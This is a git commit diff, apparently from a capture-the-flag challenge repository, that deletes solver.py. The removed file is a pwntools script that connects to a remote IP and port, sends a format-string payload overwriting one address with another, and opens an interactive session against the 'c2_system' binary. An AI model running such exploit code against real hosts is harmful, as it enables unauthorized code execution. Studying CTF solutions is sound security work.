cf571f2de961de03d19db51a420ef26aaaf88565
Rayhan Hanaputra <hanaputrarayhan@gmail.com>
2025-09-29 15:27:15 +0700

    Delete solver.py exploit code
    Remove the exploit code for the c2_system binary.

--- services/c2/writeup/solver.py
+++ services/c2/writeup/solver.py
@@ -1,10 +1,1 @@
-from pwn import *
 
-elf = context.binary = ELF("../dist/c2_system")
-p = remote("202.10.35.17", 11000)
-# p = elf.process() 
-
-payload = fmtstr_payload(6, {0x403250: 0x401c35})
-
-p.sendline(payload)
-p.interactive()
